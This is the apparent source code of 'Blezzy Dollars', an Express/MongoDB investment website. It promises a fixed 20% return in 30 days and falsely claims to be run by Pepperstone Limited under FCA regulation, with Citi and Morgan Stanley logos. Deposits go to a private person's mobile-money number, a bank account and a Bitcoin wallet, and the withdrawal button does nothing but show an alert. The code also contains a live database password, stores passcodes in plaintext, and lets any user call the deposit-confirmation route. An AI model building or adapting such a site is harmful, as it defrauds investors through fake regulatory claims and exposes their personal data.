const express = require('express');
const session = require('express-session');
const mongoose = require('mongoose');
const app = express();

// =============================================================
// ✅ DATABASE CONNECTION
// =============================================================
// Replace <PASSWORD> with your actual MongoDB password
const MONGO_URI = "mongodb+srv://gloirebolia59_db_user:fazilabolia1995@cluster0.6l5oydy.mongodb.net/blezzypay?retryWrites=true&w=majority&appName=Cluster0";
mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ Database Connected"))
    .catch(err => console.error("❌ Database Error:", err));

// =============================================================
// ✅ MIDDLEWARE & SESSION CONFIG (Optimized for Render)
// =============================================================
app.set('trust proxy', 1); 
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(session({ 
    secret: 'blezzy_key_99', 
    resave: false, 
    saveUninitialized: false,
    cookie: { 
        secure: process.env.NODE_ENV === 'production',
        maxAge: 1000 * 60 * 60 * 24 
    }
}));

// =============================================================
// ✅ USER SCHEMA
// =============================================================
const userSchema = new mongoose.Schema({
    email: { type: String, unique: true, required: true },
    passcode: String,
    name: String,
    phone: String,
    address: String,
    kycStatus: { type: String, default: "Unverified" },
    idImage: { type: String, default: "" }, 
    isAdmin: { type: Boolean, default: false },
    balance: { type: Number, default: 0 },
    investments: [{ capital: Number, profit: Number, date: Date }],
    pendingDeposit: { amount: Number, status: String, date: Date },
    transactions: [{ type: { type: String }, amount: Number, date: String, details: String }]
});
const User = mongoose.model('User', userSchema);

// =============================================================
// ✅ LEGAL & PARTNER DATA
// =============================================================
const partners = [
    { name: "Citi", img: "https://upload.wikimedia.org/wikipedia/commons/1/1b/Citi.svg" },
    { name: "Morgan Stanley", img: "https://upload.wikimedia.org/wikipedia/commons/3/34/Morgan_Stanley_Logo_1.svg" }
];

const legalFooter = `
<div style="margin-top:40px;padding-top:20px;border-top:1px solid #1c2026;text-align:center;color:#444;font-size:9px;line-height:1.6;font-family:sans-serif;">
    <p style="margin-bottom:10px;text-transform:uppercase;letter-spacing:1px;font-weight:bold;color:#666">Regulatory Information</p>
    Blezzydollars operating under its parent company<br>
    <b style="color:#666">Pepperstone Limited (United Kingdom)</b><br>
    Company Registration Number: 08965105 | Firm Reference: 684312<br>
    Regulated by the <b>Financial Conduct Authority (FCA)</b>
    <div style="margin-top:15px;opacity:0.5;display:flex;justify-content:center;gap:20px;">
        ${partners.map(p => `<img src="${p.img}" style="height:15px;filter:brightness(0) invert(1)">`).join('')}
    </div>
</div>`;

// =============================================================
// ✅ ROUTES
// =============================================================

app.get('/', (req, res) => res.send(renderLogin()));
app.get('/signup', (req, res) => res.send(renderSignup()));

app.post('/register', async (req, res) => {
    const { name, email, phone, address, passcode } = req.body;
    try {
        const existing = await User.findOne({ email: email.toLowerCase() });
        if (existing) return res.send("Email already exists. <a href='/'>Login instead</a>");
        
        const isAdmin = email.toLowerCase() === "swedbank.bolia@icloud.com"; 
        const newUser = new User({
            name, email: email.toLowerCase(), phone, address, passcode,
            kycStatus: "Unverified", isAdmin, investments: []
        });
        await newUser.save();
        res.redirect('/');
    } catch (e) { res.send("Error: " + e.message); }
});

app.post('/login', async (req, res) => {
    const inputEmail = req.body.email.toLowerCase().trim();
    const inputPass = req.body.passcode.trim();
    
    const user = await User.findOne({ email: inputEmail });
    if (user && user.passcode === inputPass) {
        req.session.userId = user._id;
        return res.redirect(user.isAdmin ? '/admin' : '/dashboard');
    }
    res.send('Invalid Credentials. <a href="/">Try Again</a>');
});

app.get('/dashboard', async (req, res) => {
    if (!req.session.userId) return res.redirect('/');
    const u = await User.findById(req.session.userId);
    if (!u) return res.redirect('/');
    res.send(renderDashboard(u));
});

app.post('/dep', async (req, res) => {
    await User.findByIdAndUpdate(req.session.userId, {
        pendingDeposit: { amount: parseFloat(req.body.amount), status: "Wait", date: new Date() }
    });
    res.redirect('/pay-now');
});

app.get('/pay-now', async (req, res) => {
    const u = await User.findById(req.session.userId);
    if (!u || !u.pendingDeposit) return res.redirect('/dashboard');
    res.send(renderPayNow(u));
});

app.post('/sent', async (req, res) => {
    const u = await User.findById(req.session.userId);
    u.pendingDeposit.status = "Pending";
    await u.save();
    res.redirect('/dashboard');
});

app.post('/swap', async (req, res) => {
    const u = await User.findById(req.session.userId);
    const now = new Date();
    let totalReleased = 0;
    const remainingInvestments = [];
    
    u.investments.forEach(inv => {
        const diffDays = Math.ceil(Math.abs(now - inv.date) / (1000 * 60 * 60 * 24));
        if (diffDays >= 30) { 
            totalReleased += (inv.capital + inv.profit);
            u.transactions.push({ type: "Maturity Payout", amount: (inv.capital + inv.profit), date: new Date().toLocaleDateString() });
        } else { remainingInvestments.push(inv); }
    });

    if (totalReleased > 0) {
        u.balance += totalReleased;
        u.investments = remainingInvestments; 
        await u.save();
    }
    res.redirect('/dashboard');
});

app.get('/admin', async (req, res) => {
    const u = await User.findById(req.session.userId);
    if (!u || !u.isAdmin) return res.send("Access Denied");
    const pendingDeposits = await User.find({ "pendingDeposit.status": "Pending" });
    res.send(renderAdmin(pendingDeposits));
});

app.post('/confirm', async (req, res) => {
    const u = await User.findById(req.body.uid);
    if (u && u.pendingDeposit) {
        const amt = u.pendingDeposit.amount;
        u.investments.push({ capital: amt, profit: amt * 0.20, date: new Date() });
        u.transactions.push({ type: "Deposit", amount: amt, date: new Date().toLocaleDateString(), details: "Locked 30 Days" });
        u.pendingDeposit = null;
        await u.save();
    }
    res.redirect('/admin');
});

app.get('/logout', (req, res) => {
    req.session.destroy(() => res.redirect('/'));
});

// =============================================================
// ✅ UI / DESIGN COMPONENTS
// =============================================================
const fonts = `<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800&display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">`;
const css = `* { box-sizing: border-box; } body { background: #000; color: white; font-family: 'Inter', sans-serif; margin: 0; padding-bottom: 80px; } .container { padding: 20px; max-width: 480px; margin: 0 auto; } .card { background: #11141a; padding: 20px; border-radius: 15px; border: 1px solid #1c2026; margin-bottom: 15px; } .balance-card { background: linear-gradient(135deg, #194bfd 0%, #6e00ff 100%); border-radius: 20px; padding: 25px; margin-bottom: 25px; } input { width: 100%; padding: 15px; background: #0b0e11; border: 1px solid #2a2f38; color: white; border-radius: 10px; margin-top: 10px; } button { width: 100%; padding: 16px; background: #194bfd; border: none; font-weight: 700; color: white; border-radius: 12px; cursor: pointer; margin-top: 15px; } .ticker-wrap { width: 100%; overflow: hidden; background: #0b0e11; padding: 10px 0; white-space: nowrap; border-bottom: 1px solid #1c2026; } .ticker { display: inline-block; animation: ticker 30s linear infinite; } @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } } .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; padding: 20px; } .m-con { background: #11141a; width: 100%; padding: 25px; border-radius: 20px; } .action-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 20px 0; } .action-btn { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #848e9c; cursor: pointer; } .icon-circle { width: 50px; height: 50px; background: #2a2f38; border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 20px; color: white; margin-bottom: 5px; }`;

function renderLogin(){ return `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${fonts}<style>${css} body{display:flex;align-items:center;justify-content:center;height:100vh}</style></head><body><div class="container" style="text-align:center"><h1>BLEZZY DOLLARS</h1><form action="/login" method="POST"><input type="email" name="email" placeholder="Email" required><input type="password" name="passcode" placeholder="Passcode" required><button>Login</button></form><p><a href="/signup" style="color:#848e9c">Create Account</a></p>${legalFooter}</div></body></html>`; }
function renderSignup(){ return `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${fonts}<style>${css}</style></head><body><div class="container"><h2>Join Blezzy</h2><form action="/register" method="POST"><input name="name" placeholder="Full Name"><input name="email" placeholder="Email"><input name="phone" placeholder="Phone"><input name="address" placeholder="Residential Address"><input type="password" name="passcode" placeholder="Passcode"><button>Create Wallet</button></form></div></body></html>`; }

function renderDashboard(u){
    const now = new Date();
    let locked = 0, claimable = 0;
    u.investments.forEach(inv => {
        const days = Math.ceil(Math.abs(now - inv.date)/(1000*60*60*24));
        if(days >= 30) claimable += (inv.capital + inv.profit);
        else locked += inv.capital;
    });

    return `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${fonts}<style>${css}</style></head><body>
    <div class="ticker-wrap"><div class="ticker">BTC: $64,210 | ETH: $3,140 | ZAR/USD: 19.05 | GOLD: $2,330</div></div>
    <div class="container">
        <div class="balance-card">
            <small style="opacity:0.7">Available Balance</small>
            <div style="font-size:32px; font-weight:800; margin:10px 0">$${u.balance.toFixed(2)}</div>
            <div style="font-size:12px">Locked Capital: $${locked.toFixed(2)}</div>
        </div>
        ${u.pendingDeposit ? `<div style="background:#e67e22; padding:15px; border-radius:10px; margin-bottom:15px; color:black"><b>Deposit Pending: $${u.pendingDeposit.amount}</b> <a href="/pay-now" style="float:right; color:white">PAY NOW</a></div>` : ''}
        <div class="action-grid">
            <div class="action-btn" onclick="openM('dep')"><div class="icon-circle"><i class="fa-solid fa-plus"></i></div>Deposit</div>
            <div class="action-btn" onclick="alert('Withdrawals process every Friday.')"><div class="icon-circle"><i class="fa-solid fa-wallet"></i></div>Withdraw</div>
            <div class="action-btn" onclick="document.getElementById('swap').submit()"><div class="icon-circle" style="${claimable > 0 ? 'background:#00c853' : ''}"><i class="fa-solid fa-unlock"></i></div>Claim</div>
            <div class="action-btn" onclick="openM('contact')"><div class="icon-circle"><i class="fa-solid fa-headset"></i></div>Support</div>
        </div>
        <form id="swap" action="/swap" method="POST" style="display:none"></form>
        <h3>Recent Transactions</h3>
        ${u.transactions.slice(-5).reverse().map(t => `<div class="card"><small>${t.date}</small><div>${t.type}: $${t.amount}</div></div>`).join('') || '<p style="color:#444">No activity yet</p>'}
        <p style="text-align:center; margin-top:30px"><a href="/logout" style="color:#444; font-size:12px">Logout Session</a></p>
    </div>
    <div id="dep" class="modal"><div class="m-con"><h2>Deposit</h2><form action="/dep" method="POST"><input type="number" name="amount" placeholder="Amount USD" required><button>Continue</button></form><button onclick="closeM()" style="background:none">Cancel</button></div></div>
    <div id="contact" class="modal"><div class="m-con"><h2>Support</h2><form action="/contact" method="POST"><input name="subject" placeholder="Subject"><textarea style="width:100%; height:100px; background:#0b0e11; color:white; border:1px solid #2a2f38; border-radius:10px; margin-top:10px" name="message"></textarea><button>Send Message</button></form><button onclick="closeM()" style="background:none">Cancel</button></div></div>
    <script>function openM(id){document.getElementById(id).style.display='flex'} function closeM(){document.querySelectorAll('.modal').forEach(m=>m.style.display='none')}</script>
    </body></html>`;
}

function renderPayNow(u) {
    const amountZAR = (u.pendingDeposit.amount * 19.05).toFixed(2); 
    return `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${fonts}<style>${css}</style></head><body>
    <div class="container" style="text-align:center">
        <h2 style="margin-top:40px">Complete Deposit</h2>
        <div style="font-size:40px; font-weight:800; color:#194bfd; margin:20px 0">$${u.pendingDeposit.amount.toFixed(2)}</div>
        <div style="color:#00c853; font-weight:700; margin-bottom:30px">≈ R${amountZAR} ZAR</div>
        <div style="text-align:left">
            <div class="card" style="background:#e61e25; border:none">
                <b>🇿🇦 Mukuru / EcoCash / HelloPaisa</b><br>
                <small>Recipient: Lebogang Vilakazi</small><br>
                <small>Phone: +27 60 895 9345</small>
            </div>
            <div class="card" style="border:1px solid #194bfd">
                <b>Security Question:</b> Who is Blezzy?<br>
                <b>Answer:</b> Easydollar
            </div>
            <div class="card"><b>🇿🇦 Capitek Bank</b><br><small>Acc: 1882242481</small></div>
            <div class="card"><b>₿ BTC Wallet</b><br><small style="word-break:break-all; font-size:10px">bc1qn4ajq8fppd3derk8a24w75jkk94pjynn063gm7</small></div>
        </div>
        <form action="/sent" method="POST"><button style="background:#00c853">I HAVE SENT THE FUNDS</button></form>
        <a href="/dashboard" style="display:block; margin-top:20px; color:#848e9c">Back to Dashboard</a>
    </div></body></html>`;
}

function renderAdmin(deposits){ 
    return `<html><head><meta name="viewport" content="width=device-width,initial-scale=1">${fonts}<style>${css}</style></head><body><div class="container">
    <h2>Admin Approval</h2>
    ${deposits.map(d=>`<div class="card"><b>${d.name}</b><br>${d.email}<br>Amount: $${d.pendingDeposit.amount}<form action="/confirm" method="POST"><input type="hidden" name="uid" value="${d._id}"><button style="background:#00c853">Confirm & Verify</button></form></div>`).join('') || '<p>No pending deposits.</p>'}
    <a href="/dashboard" style="color:#194bfd">View Personal Dashboard</a>
    </div></body></html>`; 
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`🚀 BlezzyPay Running on ${PORT}`));
